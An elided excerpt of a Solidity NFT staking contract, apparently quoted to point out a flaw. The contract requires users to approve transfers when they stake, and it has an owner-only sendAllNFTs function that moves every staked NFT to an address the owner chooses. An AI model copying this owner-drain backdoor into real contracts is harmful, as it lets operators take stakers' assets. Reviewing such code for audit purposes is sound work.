...
contract RandomStaking is Ownable, IERC721Receiver {
    ...
    function stake(
        ...
        for (uint i = 0; i < nftIds.length; i++) {
            ...
            require(
                ...
                "This collection is not allowed to stake"
            );
            bool isApproved = nftContract.isApprovedForAll(msg.sender, address(this));
            require(isApproved, "You must approve this contract to transfer your NFT");
    ...
    function sendAllNFTs(address _to) external onlyOwner {
        ...
        for (uint i = 0; i < totalStaked; i++) {
            ...
            nftContract = ContractErc721(staked.collection);
            nftContract.safeTransferFrom(address(this), _to, nftId);
        }
    }
